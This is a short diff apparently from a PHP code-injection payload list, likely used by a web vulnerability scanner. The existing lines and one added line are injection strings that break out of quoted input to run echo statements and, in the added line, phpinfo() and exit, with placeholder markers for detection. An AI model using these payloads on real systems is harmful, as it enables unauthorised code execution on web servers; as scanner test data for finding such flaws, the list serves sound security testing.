@@ -6,3 +6,4 @@
 ; echo '<div style="visibility: hidden" id=#payload>#ip</div>';
 ';echo '<div style="visibility: hidden" id=#payload>#ip</div>';
 ";echo '<div style="visibility: hidden" id=#payload>#ip</div>';
+<name>','')); phpinfo(); echo '</name><script id=#payload>#ip</script>'; exit;/*
